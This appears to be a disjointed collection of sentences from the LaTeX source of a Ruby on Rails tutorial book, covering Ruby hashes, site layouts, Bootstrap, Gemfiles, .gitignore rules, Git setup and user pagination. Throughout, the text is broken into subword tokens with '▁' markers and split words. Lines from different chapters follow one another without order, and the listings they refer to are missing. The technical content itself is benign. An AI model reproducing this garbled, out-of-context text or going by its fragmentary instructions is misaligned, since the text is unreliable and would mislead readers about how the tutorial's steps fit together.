▁In ▁other ▁words , ▁there ' s ▁a ▁suit able ▁base ▁title , ▁but ▁there ' s ▁also ▁a ▁tr ailing ▁vertical ▁bar ▁character ▁\ k ode { | } ▁at ▁the ▁end .
▁Start ▁the ▁console ▁at ▁the ▁command ▁line ▁as ▁follows :
▁There ' s ▁an ▁important ▁difference , ▁though ; ▁Ruby ▁won ' t ▁interpolate ▁into ▁single - quot ed ▁strings :
▁When ▁build ing ▁web ▁applications , ▁it ▁is ▁often ▁useful ▁to ▁get ▁a ▁high - level ▁ overview ▁of ▁the ▁user ▁interface ▁as ▁ early ▁as ▁possible .
▁As ▁a ▁first ▁step ▁toward ▁adding ▁links ▁and ▁style s ▁to ▁the ▁sample ▁application , ▁we ' ll ▁update ▁the ▁site ▁layout ▁file ▁\ k ode { application . html . erb } ▁( last ▁seen ▁in ▁Listing ~\ ref { code : application _ layout _ full _ title }) ▁with ▁ additional ▁HTML ▁structure .
▁Ruby ▁1.9 ▁actually ▁guarantee s ▁that ▁hashes ▁keep ▁their ▁elements ▁in ▁the ▁same ▁order ▁entered , ▁but ▁it ▁would ▁be ▁un wise ▁ever ▁to ▁count ▁on ▁a ▁particular ▁order ing .
▁S ince ▁it ' s ▁so ▁common ▁for ▁hashes ▁to ▁use ▁symbols ▁as ▁keys , ▁Ruby ~ 1 . 9 ▁supports ▁a ▁new ▁syntax ▁just ▁for ▁this ▁special ▁case :
▁To ▁take ▁advantage ▁of ▁the ▁up com ing ▁style ▁elements , ▁we ' ll ▁add ▁some ▁extra ▁elements ▁to ▁the ▁\ k ode { home . html . erb } ▁view ▁( Listing ~\ ref { code : signup _ button }).
▁To ▁make ▁this ▁clear er , ▁let ' s ▁look ▁at ▁the ▁HTML ▁this ▁tag ▁produce s
▁The ▁\ k ode { alt } ▁attribute ▁is ▁what ▁will ▁be ▁displayed ▁if ▁there ▁is ▁no ▁image , ▁and ▁it ▁is ▁also ▁what ▁will ▁be ▁displayed ▁by ▁screen ▁readers ▁for ▁the ▁ visual ly ▁i mp a ir ed .
▁L uckily , ▁Rails ▁includes ▁a ▁default ▁\ k ode { alt } ▁attribute ; ▁if ▁you ▁don ' t ▁specify ▁the ▁attribute ▁in ▁the ▁call ▁to ▁\ k ode { image \_ tag }, ▁Rails ▁just ▁uses ▁the ▁image ▁filename ▁( m in us ▁extension ).
▁In ▁Ruby , ▁they ▁are ▁optional ; ▁these ▁two ▁are ▁equivalent :
▁ Adding ▁the ▁\ text tt { bootstrap - sass } ▁gem ▁to ▁the ▁\ k ode { Gemfile }.
▁When ▁hashes ▁are ▁the ▁\ emph { last } ▁argument ▁in ▁a ▁function ▁call , ▁the ▁ curl y ▁braces ▁are ▁optional ; ▁these ▁two ▁are ▁equivalent :
▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ config }.
▁ Adding ▁a ▁line ▁for ▁asset ▁pipeline ▁ compatibility .
▁Here ▁both ▁the ▁directory ▁name ▁and ▁filename ▁are ▁important .
▁( It ' s ▁actually ▁at ▁ 78 ▁columns , ▁which ▁gives ▁you ▁a ▁little ▁m ar g in ▁for ▁error .)
▁calls ▁the ▁\ k ode { stylesheet \_ link \_ tag } ▁function ▁with ▁two ▁arguments : ▁a ▁string , ▁indicat ing ▁the ▁path ▁to ▁the ▁stylesheet , ▁and ▁a ▁hash ▁with ▁two ▁elements , ▁indicat ing ▁the ▁m edia ▁type ▁and ▁tell ing ▁Rails ▁to ▁use ▁the ▁\ href { https :// github . com / rails / turbolinks }{ turbolinks } ▁feature ▁( new ▁in ▁Rails ~ 4 ).
▁( Turbolinks ▁will ▁be ▁describe d ▁in ▁more ▁detail ▁in ▁a ▁future ▁d ra f t ▁of ▁this ▁book .)
▁Because ▁of ▁the ▁\ k ode { navbar - fixed \ - to p } ▁class ▁in ▁the ▁\ k ode { header } ▁tag , ▁Bootstrap ▁fix es ▁the ▁navigation ▁bar ▁to ▁the ▁to p ▁of ▁the ▁page , ▁so ▁the ▁p adding ▁serve s ▁to ▁separate ▁the ▁main ▁text ▁from ▁the ▁navigation .
▁Note ▁the ▁leading ▁ underscore ▁on ▁the ▁filename ▁\ k ode { \_ shim . html . erb } ; ▁this ▁ underscore ▁is ▁the ▁ universal ▁convention ▁for ▁naming ▁partials , ▁and ▁a mong ▁other ▁things ▁make s ▁it ▁possible ▁to ▁identify ▁all ▁the ▁partials ▁in ▁a ▁directory ▁at ▁a ▁g l ance .
▁If ▁this ▁example ▁ str ike s ▁you ▁as ▁a ▁bit ▁con tr ive d , ▁good ; ▁this ▁is ▁by ▁design .
▁For ▁those ▁ familiar ▁with ▁JavaScript , ▁this ▁functionality ▁is ▁compar able ▁to ▁using ▁a ▁built - in ▁class ▁proto type ▁object ▁to ▁a ug ment ▁the ▁class .
▁( T hanks ▁to ▁reader ▁\ href { http :// get satisf action . com / railstutorial / to p ic s / adding _ methods _ to _ built _ in _ classes _ com p ar able _ to _ using _ javascripts _ proto type _ object }{ E r i k ▁E l d r id ge } ▁for ▁point ing ▁this ▁out .)
▁This ▁is ▁why , ▁if ▁your ▁principal ▁programming ▁interest ▁is ▁writing ▁web ▁applications , ▁I ▁recommend ▁learning ▁Rails ▁first , ▁the n ▁learning ▁Ruby , ▁the n ▁loop ing ▁back ▁to ▁Rails .
▁Then ▁commit ▁the ▁other ▁changes ▁to ▁the ▁main ▁source ▁code ▁repository :
▁Then ▁create ▁a ▁\ k ode { params } ▁hash ▁so ▁that ▁\ k ode { params [: f ather ]} ▁is ▁\ k ode { person 1 }, ▁\ k ode { params [: m other ]} ▁is ▁\ k ode { person 2 }, ▁and ▁\ k ode { params [: child ]} ▁is ▁\ k ode { person 3 }.
▁Find ▁an ▁online ▁version ▁of ▁the ▁Ruby ▁API ▁and ▁read ▁about ▁the ▁\ k ode { Hash } ▁method ▁\ k ode { merge }.
▁in ▁Listing ~\ ref { code : contact _ page _ test }.
▁S u b m it ting ▁the ▁\ href { http ://0.0.0.0:3000/ sessions / new }{/ sessions / new } ▁form ▁the n ▁yields ▁the ▁result ▁show n ▁in ▁F igure ~\ ref { fig : initial _ failed _ login _ rails _3} .
▁We ' ll ▁start ▁in ▁the ▁header ▁partial , ▁\ k ode { \_ header . html . erb } ▁( Listing ~\ ref { code : header _ partial _ links }), ▁which ▁has ▁links ▁to ▁the ▁Home ▁and ▁Help ▁pages .
▁The ▁other ▁place ▁with ▁links ▁is ▁the ▁ footer ▁partial , ▁\ k ode { \_ footer . html . erb }, ▁which ▁has ▁links ▁for ▁the ▁About ▁and ▁Contact ▁pages ▁( Listing ~\ ref { code : footer _ partial _ links }).
▁With ▁that , ▁our ▁layout ▁has ▁links ▁to ▁all ▁the ▁static ▁pages ▁created ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁so ▁that , ▁for ▁example , ▁\ href { http ://0.0.0.0:3000/ about }{/ about } ▁go es ▁to ▁the ▁About ▁page ▁( F igure ~\ ref { fig : about _ page }).
▁The ▁About ▁page ▁at ▁\ href { http ://0.0.0.0:3000/ about }{/ about }.
▁Link ing ▁the ▁button ▁to ▁the ▁Signup ▁page .
▁The ▁new ▁signup ▁page ▁at ▁\ href { http ://0.0.0.0:3000/ signup }{/ signup }.
▁in ▁Listing ~\ ref { code : full _ title _ helper _ tests }.
▁Tests ▁for ▁the ▁\ k ode { full \_ title } ▁helper .
▁As ▁\ href { http :// s ivers . org }{ D er e k ▁S ivers } ▁note s ▁in ▁the ▁for e word , ▁this ▁book ▁is ▁structure d ▁as ▁a ▁line ar ▁ n ar ra tive , ▁design ed ▁to ▁be ▁read ▁from ▁start ▁to ▁finish .
▁If ▁you ▁are ▁used ▁to ▁skip p ing ▁around ▁in ▁technical ▁book s , ▁tak ing ▁this ▁line ar ▁approach ▁m ight ▁require ▁some ▁a d j us t ment , ▁but ▁I ▁suggest ▁giv ing ▁it ▁a ▁try .
▁You ▁can ▁think ▁of ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁as ▁a ▁video ▁game ▁where ▁you ▁are ▁the ▁main ▁character , ▁and ▁where ▁you ▁level ▁up ▁as ▁a ▁Rails ▁developer ▁in ▁each ▁chapter .
▁( The ▁ exercises ▁are ▁the ▁\ href { http :// en . wiki p edia . org / wiki / B o s s _ ( video _ g am ing ) # M in i b o s s }{ mini b o s s es }. )
▁Rails ▁also ▁ adapt s ▁ r api d ly ▁to ▁new ▁development s ▁in ▁web ▁ tech no log y ▁and ▁framework ▁design .
▁This ▁means ▁that , ▁no ▁matter ▁where ▁you ▁current ly ▁are ▁in ▁your ▁ knowledg e ▁of ▁web ▁development , ▁by ▁the ▁time ▁you ▁finish ▁this ▁tutorial ▁you ▁will ▁be ▁ready ▁for ▁more ▁advanced ▁Rails ▁resources , ▁as ▁well ▁as ▁for ▁the ▁more ▁system at ic ▁treat ment s ▁of ▁the ▁other ▁subject s ▁mentioned .
▁It ▁also ▁means ▁that ▁there ' s ▁a ▁\ emph { lo t } ▁of ▁material ▁to ▁cover ; ▁if ▁you ▁don ' t ▁already ▁have ▁much ▁experience ▁programming ▁computer s , ▁you ▁m ight ▁find ▁it ▁over w hel m ing .
▁The ▁comments ▁below ▁contain ▁some ▁suggest ion s ▁for ▁approach ing ▁the ▁\ emph { Rails ▁Tutorial } ▁depending ▁on ▁your ▁background .
▁A nother ▁common ▁question ▁is ▁whether ▁to ▁use ▁tests ▁from ▁the ▁start .
▁If ▁you ▁find ▁yourself ▁getting ▁b ogg ed ▁down ▁by ▁the ▁tests , ▁I ▁suggest ▁either ▁skip p ing ▁them ▁on ▁a ▁first ▁reading ▁or ▁( even ▁better ) ▁using ▁them ▁as ▁a ▁tool ▁to ▁verify ▁your ▁code ' s ▁correct n es s ▁without ▁worry ing ▁about ▁how ▁they ▁work .
▁If ▁you ▁are ▁completely ▁new ▁to ▁web ▁programming ▁and ▁find ▁the ▁\ emph { Rails ▁Tutorial } ▁too ▁difficult , ▁I ▁suggest ▁learning ▁the ▁basic s ▁of ▁HTML ▁and ▁CSS ▁and ▁the n ▁giv ing ▁the ▁\ emph { Rails ▁Tutorial } ▁another ▁go .
▁( U nfortunately , ▁I ▁don ' t ▁have ▁a ▁person al ▁recommend ation ▁here , ▁but ▁\ href { http :// head first l abs . com / books / h f html / }{\ emph { Head ▁First ▁HTML } } ▁look s ▁pro m is ing , ▁and ▁one ▁reader ▁recommend s ▁\ href { http :// www . a mazon . com / g p / product / 0 59 6 5 2 6 87 3 }{\ emph { CSS : ▁The ▁ Missing ▁M an u al } } ▁by ▁ David ▁S a w y er ▁M c F ar l and .)
▁You ▁m ight ▁also ▁consider ▁reading ▁the ▁first ▁few ▁chapter s ▁of ▁\ href { http :// www . a mazon . com / g p / product /1 4 3022 36 34 }{\ emph { B eginning ▁Ruby } } ▁by ▁P e ter ▁Co o p er , ▁which ▁start s ▁with ▁sample ▁applications ▁much ▁small er ▁than ▁a ▁full - b low n ▁web ▁app .
▁Be ▁ w ar n ed ▁that ▁if ▁your ▁background ▁is ▁in ▁C / C ++ ▁or ▁Java , ▁you ▁may ▁find ▁Ruby ▁a ▁bit ▁of ▁an ▁odd ▁d uck , ▁and ▁it ▁m ight ▁take ▁time ▁to ▁get ▁used ▁to ▁it ; ▁just ▁ s tic k ▁with ▁it ▁and ▁eventual ly ▁you ' ll ▁be ▁fine .
▁( Ruby ▁even ▁let s ▁you ▁put ▁semi co lo n s ▁at ▁the ▁end s ▁of ▁lines ▁if ▁you ▁m is s ▁them ▁too ▁much .)
▁The ▁\ emph { Rails ▁Tutorial } ▁cover s ▁all ▁the ▁web - specific ▁idea s ▁you ' ll ▁need , ▁so ▁don ' t ▁worry ▁if ▁you ▁don ' t ▁current ly ▁know ▁a ▁\ text tt { POST } ▁from ▁a ▁\ text tt { PATCH }.
▁The ▁basic s ▁of ▁what ▁we ▁cover ▁will ▁likely ▁be ▁ familiar , ▁but ▁test - driven ▁development ▁may ▁be ▁new ▁to ▁you , ▁as ▁may ▁be ▁the ▁structure d ▁REST ▁style ▁favor ed ▁by ▁Rails .
▁Ruby ▁has ▁its ▁own ▁id io s y n c ra s ies , ▁so ▁those ▁will ▁likely ▁be ▁new , ▁too .
▁ Base d ▁on ▁reader ▁feedback , ▁I ' m ▁confident ▁that ▁you ▁can ▁ still ▁get ▁a ▁lot ▁out ▁of ▁this ▁book .
▁A mong ▁other ▁things , ▁the ▁technique s ▁here ▁may ▁be ▁more ▁up - to - date ▁than ▁the ▁one s ▁you ▁ pick ed ▁up ▁when ▁you ▁original ly ▁ learned ▁Rails .
▁After ▁finish ing ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }, ▁I ▁recommend ▁that ▁experience d ▁programmer s ▁read ▁\ href { http :// www . a mazon . com / g p / product / 19 3 39 88 6 57 }{\ emph { The ▁We ll - G rounded ▁Ruby ist } } ▁by ▁ David ~ A . ▁B la c k , ▁\ href { http :// www . a mazon . com / Eloquent - Ruby - A d d is on - We s le y - P rofessional - Seri es / d p / 0 3 2 1 58 4 10 4 / }{\ emph { Eloquent ▁Ruby } } ▁by ▁R us s ▁O l s en , ▁or ▁\ href { http :// www . a mazon . com / g p / product / 06 7 23 2 88 44 }{\ emph { The ▁Ruby ▁Way } } ▁by ▁H al ▁F ul to n , ▁which ▁is ▁also ▁fai r ly ▁advanced ▁but ▁take s ▁a ▁more ▁topic al ▁approach .
▁Before ▁mov ing ▁on ▁with ▁the ▁rest ▁of ▁the ▁introduction , ▁I ' d ▁like ▁to ▁take ▁a ▁moment ▁to ▁address ▁the ▁one ▁issue ▁that ▁d ogg ed ▁the ▁Rails ▁framework ▁the ▁most ▁in ▁its ▁ early ▁days : ▁the ▁suppose d ▁in ability ▁of ▁Rails ▁to ▁`` s ca le '' --- i . e . , ▁to ▁handle ▁large ▁amount s ▁of ▁traffic .
▁ Part ▁of ▁this ▁issue ▁relie d ▁on ▁a ▁m is concept ion ; ▁\ href { http :// id le process . word pre s s . com / 200 9 / 11 / 2 4 / present ation - sum m ary - high - perform ance - at - mass ive - s ca le - less on s - learned - at - fa ce book /}{ you ▁scale ▁a ▁\ emph { site }, ▁not ▁a ▁framework }, ▁and ▁Rails , ▁as ▁a we some ▁as ▁it ▁is , ▁is ▁only ▁a ▁framework .
▁So ▁the ▁real ▁question ▁should ▁have ▁been , ▁`` C an ▁a ▁site ▁built ▁with ▁Rails ▁scale ? ''
▁In ▁any ▁case , ▁the ▁question ▁has ▁now ▁been ▁defin i tive ly ▁an s w er ed ▁in ▁the ▁a ff ir ma tive : ▁some ▁of ▁the ▁most ▁heav ily ▁traffic k ed ▁site s ▁in ▁the ▁world ▁use ▁Rails .
▁ Actually ▁\ emph { do ing } ▁the ▁scaling ▁is ▁ beyond ▁the ▁scope ▁of ▁just ▁Rails , ▁but ▁rest ▁as s ur ed ▁that ▁if ▁\ emph { your } ▁application ▁ever ▁needs ▁to ▁handle ▁the ▁load ▁of ▁H ul u ▁or ▁the ▁ Y el low ▁Pages , ▁Rails ▁won ' t ▁stop ▁you ▁from ▁tak ing ▁over ▁the ▁world .
▁When ▁reading ▁the ▁\ emph { Rails ▁Tutorial }, ▁you ▁may ▁find ▁it ▁convenient ▁to ▁follow ▁an ▁internal ▁section ▁link ▁to ▁look ▁at ▁the ▁reference ▁and ▁the n ▁immediately ▁go ▁back ▁to ▁where ▁you ▁were ▁before .
▁This ▁is ▁easy ▁when ▁reading ▁the ▁book ▁as ▁a ▁web ▁page , ▁since ▁you ▁can ▁just ▁use ▁the ▁B ac k ▁button ▁of ▁your ▁browser , ▁but ▁both ▁A do be ▁Read er ▁and ▁OS ~ X ' s ▁P re view ▁allow ▁you ▁to ▁do ▁this ▁with ▁the ▁P D F ▁as ▁well .
▁In ▁Read er , ▁you ▁can ▁right - click ▁on ▁the ▁document ▁and ▁select ▁`` P re v ious ▁View '' ▁to ▁go ▁back .
▁In ▁P re view , ▁use ▁the ▁G o ▁menu : ▁\ text tt { G o ▁ > ▁B ac k }.
▁M any ▁people ▁ er r one ous ly ▁believe ▁that ▁\ k ode { s u do } ▁stand s ▁for ▁`` super user ▁do '' ▁because ▁it ▁run s ▁commands ▁as ▁the ▁ super user ▁( root ) ▁by ▁default .
▁In ▁fact , ▁\ k ode { s u do } ▁is ▁a ▁ concat en ation ▁of ▁the ▁\ k ode { s u } ▁command ▁and ▁the ▁English ▁word ▁`` do '' , ▁and ▁\ k ode { s u } ▁stand s ▁for ▁`` sub st it ute ▁user '' , ▁as ▁you ▁can ▁verify ▁by ▁typing ▁\ k ode { ma n ▁ s u } ▁in ▁your ▁ s hel l .
▁This ▁ et y m o log y ▁also ▁suggest s ▁the ▁pro n un ci ation ▁`` S O O - d oo '' ▁( because ▁the ▁word ▁`` do '' ▁is ▁ pronoun c ed ▁`` d oo '') , ▁although ▁the ▁alternate ▁pro n un ci ation ▁`` S O O - do h '' ▁is ▁also ▁common .
▁On ▁Windows , ▁the ▁analogous ▁directory ▁would ▁be
▁C : \ Site s \ sample _ app
▁For ▁cl ar ity , ▁the ▁\ emph { Rails ▁Tutorial } ▁will ▁refer ▁to ▁the ▁Rails ▁root ▁as ▁the ▁\ emph { application ▁root }, ▁and ▁hence for th ▁all ▁directories ▁will ▁be ▁relative ▁to ▁this ▁directory .
▁For ▁example , ▁the ▁\ k ode { config } ▁directory ▁of ▁my ▁sample ▁application ▁is
▁The ▁application ▁root ▁directory ▁here ▁is ▁everything ▁before ▁\ k ode { config }, ▁i . e . ,
▁For ▁brevity , ▁when ▁refer r ing ▁to ▁the ▁file
▁I ' ll ▁omit ▁the ▁application ▁root ▁and ▁simply ▁write ▁\ k ode { config / routes . rb }.
▁# ▁gem ▁' the ruby r ac er ' , ▁platform s : ▁: ruby
▁# ▁Read ▁more : ▁ https :// github . com / rails / turbolinks
▁# ▁Use ▁ unicorn ▁as ▁the ▁app ▁server
▁# ▁Use ▁ debugger
▁# ▁gem ▁' debugger ' , ▁group : ▁[ : development , ▁: test ]
▁as ▁seen ▁in ▁Listing ~\ ref { code : gemfile _ sqlite _ version }.
▁The ▁syntax
▁install s ▁the ▁latest ▁version ▁of ▁the ▁\ k ode { uglifier } ▁gem ▁( which ▁handle s ▁file ▁compression ▁for ▁the ▁asset ▁pipeline ) ▁as ▁long ▁as ▁it ' s ▁greater ▁than ▁or ▁equal ▁to ▁version ~\ k ode { 1 . 3 . 0 }--- even ▁if ▁it ' s , ▁say , ▁version ~\ k ode { 7 . 2 }.
▁ Meanwhile , ▁the ▁code
▁install s ▁the ▁gem ▁\ k ode { coffee - rails } ▁( also ▁needed ▁by ▁the ▁asset ▁pipeline ) ▁as ▁long ▁as ▁it ' s ▁new er ▁than ▁version ~\ k ode { 4 . 0 . 0 } ▁but ▁not ▁new er ▁than ▁\ k ode { 4 . 1 }.
▁U nfortunately , ▁experience ▁shows ▁that ▁even ▁minor ▁point ▁release s ▁can ▁break ▁things , ▁so ▁for ▁the ▁\ emph { Rails ▁Tutorial } ▁we ' ll ▁ er r ▁on ▁the ▁side ▁of ▁caution ▁by ▁including ▁exact ▁version ▁number s ▁for ▁virtual ly ▁all ▁gems .
▁In ▁fact , ▁you ▁can ▁even ▁leave ▁off ▁\ k ode { install }.
▁The ▁\ k ode { bundle } ▁command ▁by ▁itself ▁is ▁an ▁alias ▁for ▁\ k ode { bundle ▁install }.
▁=> ▁Rails ▁application ▁starting ▁on ▁ http :// 0 . 0 . 0 . 0 : 3 000
▁Open ing ▁the ▁project
▁ $ ▁< edit or ▁name > ▁ .
▁ $ ▁sub l ▁ .
▁( where ▁\ k ode { v i m } ▁m ight ▁be ▁\ k ode { g v i m } ▁or ▁\ k ode { m v i m } ▁depending ▁on ▁which ▁f la v or ▁of ▁Vi m ▁you ▁use ).
▁As ▁a ▁final ▁setup ▁step , ▁you ▁can ▁optional ly ▁set ▁the ▁editor ▁Git ▁will ▁use ▁for ▁commit ▁messages .
▁If ▁you ▁use ▁a ▁gra ph ical ▁editor ▁such ▁as ▁S ublime ▁Text , ▁ TextMate , ▁g V i m , ▁or ▁Mac V i m , ▁you ▁need ▁to ▁use ▁a ▁flag ▁to ▁make ▁sure ▁that ▁the ▁editor ▁sta y s ▁attach ed ▁to ▁the ▁ s hel l ▁instead ▁of ▁d et a ch ing ▁immediately
▁No rm ally ▁this ▁is ▁a ▁feature , ▁since ▁it ▁let s ▁you ▁continu e ▁to ▁use ▁the ▁command ▁line ▁after ▁ la un ch ing ▁your ▁editor , ▁but ▁Git ▁interpret s ▁the ▁d et a ch ment ▁as ▁ closing ▁the ▁file ▁with ▁an ▁empty ▁commit ▁message , ▁which ▁prevent s ▁the ▁commit ▁from ▁going ▁through .
▁I ▁only ▁ ment ion ▁this ▁point ▁because ▁it ▁can ▁be ▁serious ly ▁confusing ▁if ▁you ▁try ▁to ▁set ▁your ▁editor ▁to ▁\ k ode { sub l } ▁or ▁\ k ode { g v i m } ▁without ▁the ▁flag .
▁( If ▁you ▁find ▁this ▁note ▁confusing , ▁it ▁is ▁safe ▁to ▁ignore ▁it .)
▁Re place ▁\ k ode {" sub l ▁- w "} ▁with ▁\ k ode {" m ate ▁- w "} ▁for ▁ TextMate , ▁\ k ode {" g v i m ▁- f "} ▁for ▁g V i m , ▁or ▁\ k ode {" m v i m ▁- f "} ▁for ▁Mac V i m .
▁There ' s ▁a ▁minor ▁com plication , ▁though : ▁by ▁default ▁Git ▁track s ▁the ▁changes ▁of ▁\ emph { all } ▁the ▁files , ▁but ▁there ▁are ▁some ▁files ▁we ▁don ' t ▁want ▁to ▁track .
▁For ▁example , ▁Rails ▁creates ▁log ▁files ▁to ▁record ▁the ▁behavior ▁of ▁the ▁application ; ▁these ▁files ▁change ▁frequent ly , ▁and ▁we ▁don ' t ▁want ▁our ▁version ▁control ▁system ▁to ▁have ▁to ▁update ▁them ▁constant ly .
▁Git ▁has ▁a ▁simple ▁ mechanism ▁to ▁ignore ▁such ▁files : ▁simply ▁include ▁a ▁file ▁called ▁\ k ode { . gitignore } ▁in ▁the ▁application ▁root ▁directory ▁with ▁some ▁rules ▁tell ing ▁Git ▁which ▁files ▁to ▁ignore
▁If ▁you ▁can ' t ▁see ▁the ▁\ k ode { . gitignore } ▁file ▁in ▁your ▁directory , ▁you ▁may ▁need ▁to ▁configure ▁your ▁directory ▁view er ▁to ▁show ▁hidden ▁files .
▁as ▁show n ▁in ▁Listing ~\ ref { code : default _ gitignore }.
▁The ▁default ▁\ k ode { . gitignore } ▁created ▁by ▁the ▁\ k ode { rails } ▁command .
▁# ▁See ▁ http :// help . github . com / i gnore - file s / ▁for ▁more ▁about ▁ignoring ▁files .
▁# ▁If ▁you ▁find ▁yourself ▁ignoring ▁temporary ▁files ▁generated ▁by ▁your ▁text ▁editor
▁# ▁or ▁operat ing ▁system , ▁you ▁ probably ▁want ▁to ▁add ▁a ▁g lo b al ▁ignore ▁instead :
▁# ▁git ▁config ▁-- g lo b al ▁core . exclude s file ▁' ~ / . gitignore _ g lo b al '
▁# ▁I gnore ▁bundle r ▁config .
▁/ . bundle
▁# ▁I gnore ▁the ▁default ▁SQLite ▁database .
▁/ db / * . sqlite 3
▁/ db / * . sqlite 3- j our n al
▁# ▁I gnore ▁all ▁log file s ▁and ▁te mp file s .
▁/ log / * . log
▁ Most ▁of ▁these ▁ignored ▁files ▁change ▁frequent ly ▁and ▁automatically , ▁so ▁including ▁them ▁under ▁version ▁control ▁is ▁unnecessary .
▁More over , ▁when ▁collaborat ing ▁with ▁other s , ▁these ▁irrelevant ▁changes ▁can ▁cause ▁f ru str at ing ▁conflicts .
▁This ▁a ug ment ed ▁\ k ode { . gitignore } ▁arrange s ▁to ▁ignore ▁Rails ▁documentation ▁files , ▁Vi m ▁and ▁E m ac s ▁ s w ap ▁files , ▁and ▁( for ▁OS ~ X ▁users ) ▁the ▁we ir d ▁\ k ode { . D S \_ Store } ▁directories ▁created ▁by ▁the ▁Mac ▁Find er ▁application .
▁An ▁a ug ment ed ▁\ k ode { . gitignore } ▁file .
▁# ▁I gnore ▁other ▁un n e ed ed ▁files .
▁* . s w p
▁ . project
▁D S _ Store
▁ . id e a
▁ . secret
▁F inally , ▁we ' ll ▁add ▁the ▁files ▁in ▁your ▁new ▁Rails ▁project ▁to ▁Git ▁and ▁the n ▁commit ▁the ▁results .
▁You ▁can ▁add ▁all ▁the ▁files ▁( a part ▁from ▁those ▁that ▁match ▁the ▁ignore ▁pattern s ▁in ▁\ k ode { . gitignore }) ▁as ▁follows :
▁As ▁mentioned ▁above , ▁it ' s ▁also ▁possible ▁to ▁a b and on ▁your ▁topic ▁branch ▁changes , ▁in ▁this ▁case ▁with ▁\ k ode { git ▁branch ▁- D } :
▁The ▁result ing ▁\ k ode { Gemfile } ▁appears ▁as ▁in ▁Listing ~\ ref { code : gemfile _ p g _ gem }.
▁# ruby - gem set = railstutorial _ rails _4_0
▁( Here ▁I ' ve ▁also ▁added ▁the ▁optional ▁RVM ▁gem set ▁line ▁for ▁convenience .
▁You ▁should ▁sub st it ute ▁\ k ode { ' 1.9.3 ' } ▁if ▁that ' s ▁the ▁version ▁of ▁Ruby ▁you ' re ▁using , ▁though ▁for ▁this ▁tutorial ▁the ▁difference ▁should n ' t ▁ever ▁matter .)
▁A ▁\ k ode { Gemfile } ▁with ▁added ▁gems .
▁Because ▁the ▁only ▁gems ▁added ▁in ▁Listing ~\ ref { code : gemfile _ p g _ gem } ▁are ▁restrict ed ▁to ▁a ▁production ▁environment , ▁right ▁now ▁this ▁command ▁does n ' t ▁actually ▁install ▁any ▁ additional ▁local ▁gems , ▁but ▁it ' s ▁needed ▁to ▁update ▁\ k ode { Gemfile . lock } ▁with ▁the ▁\ text tt { p g } ▁and ▁\ text tt { rails \_ 12 factor } ▁gems .
▁If ▁you ▁want ▁to ▁share ▁your ▁ prog re s s ▁at ▁this ▁point , ▁feel ▁free ▁to ▁send ▁a ▁t we et ▁or ▁F a ce book ▁status ▁update ▁with ▁something ▁like ▁this :
▁A ▁user ▁profile ▁with ▁a ▁follow ▁button ▁(\ href { http ://0.0.0.0:3000/ users / 2 }{/ users / 2 }).
▁A ▁user ▁profile ▁with ▁an ▁unfollow ▁button ▁(\ href { http ://0.0.0.0:3000/ users / 5 }{/ users / 5 }).
▁Then ▁we ' ll ▁make ▁a ▁list ing ▁of ▁all ▁users ▁( also ▁requiring ▁authorization ), ▁which ▁will ▁motivate ▁the ▁introduction ▁of ▁sample ▁data ▁and ▁pagination .
▁We ▁can ▁see ▁the ▁result ▁of ▁the ▁before ▁filter ▁in ▁Listing ~\ ref { code : authorize _ before _ filter } ▁by ▁logging ▁out ▁and ▁attempt ing ▁to ▁access ▁the ▁user ▁edit ▁page ▁\ href { http ://0.0.0.0:3000/ users /1/ edit }{/ users /1/ edit }, ▁as ▁seen ▁in ▁F igure ~\ ref { fig : protected _ log _ in }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : fixture _ second _ user }.
▁To ▁implement ▁the ▁forwarding ▁itself , ▁we ▁use ▁the ▁\ k ode { redirect \_ back \_ or } ▁method ▁to ▁redirect ▁to ▁the ▁request ed ▁URL ▁if ▁it ▁exists , ▁or ▁some ▁default ▁URL ▁otherwise , ▁which ▁we ▁add ▁to ▁the ▁Sessions ▁controller ▁\ k ode { create } ▁action ▁to ▁redirect ▁after ▁successful ▁login ▁( Listing ~\ ref { code : friendly _ session _ create }).
▁This ▁evaluate s ▁to ▁\ k ode { session [: forwarding \_ url ]} ▁unless ▁it ' s ▁\ k ode { nil }, ▁in ▁which ▁case ▁it ▁evaluate s ▁to ▁the ▁given ▁default ▁URL .
▁Note ▁that ▁Listing ~\ ref { code : friendly _ forwarding _ code } ▁is ▁careful ▁to ▁remove ▁the ▁forwarding ▁URL ; ▁otherwise , ▁subsequent ▁login ▁attempt s ▁would ▁forward ▁to ▁the ▁ protected ▁page ▁un til ▁the ▁user ▁close d ▁their ▁browser .
▁The ▁user ▁profile ▁with ▁microposts ▁(\ href { http ://0.0.0.0:3000/ users /1}{ / users /1 }).
▁The ▁profile ▁of ▁a ▁different ▁user , ▁also ▁with ▁microposts ▁(\ href { http ://0.0.0.0:3000/ users / 5 }{/ users / 5 }).
▁First , ▁we ' ll ▁add ▁the ▁\ emph { Faker } ▁gem ▁to ▁the ▁\ k ode { Gemfile }, ▁which ▁will ▁allow ▁us ▁to ▁make ▁sample ▁users ▁with ▁semi - re a list ic ▁names ▁and ▁email ▁addresses ▁( Listing ~\ ref { code : fa k er _ gemfile }).
▁ Adding ▁the ▁ Faker ▁gem ▁to ▁the ▁\ k ode { Gemfile }.
▁The ▁updated ▁\ k ode { Gemfile } ▁appears ▁in ▁Listing ~\ ref { code : will _ paginate _ gem }.
▁ Includ ing ▁\ text tt { will \_ paginate } ▁in ▁the ▁\ k ode { Gemfile }.
▁ Adding ▁microposts ▁creation ▁to ▁the ▁Home ▁page ▁(\ href { http ://0.0.0.0:3000/ }{/ }).
▁If ▁you ▁now ▁click ▁on ▁either ▁the ~\ href { http ://0.0.0.0:3000/ users ? page = 2 }{ 2 } ▁link ▁or ▁\ href { http ://0.0.0.0:3000/ users ? page = 2 }{ N ext } ▁link , ▁you ' ll ▁get ▁the ▁second ▁page ▁of ▁results , ▁as ▁show n ▁in ▁F igure ~\ ref { fig : user _ index _ page _ two _ rails _3} .
▁as ▁show n ▁in ▁Listing ~\ ref { code : users _ fixtures _ ext ra _ users }.
▁Here ▁Rails ▁infer s ▁that ▁\ k ode {@ users } ▁is ▁a ▁list ▁of ▁\ k ode { User } ▁objects ; ▁more over , ▁when ▁called ▁with ▁a ▁collection ▁of ▁users , ▁Rails ▁automatically ▁iterate s ▁through ▁them ▁and ▁render s ▁each ▁one ▁with ▁the ▁\ k ode { \_ user . html . erb } ▁partial .
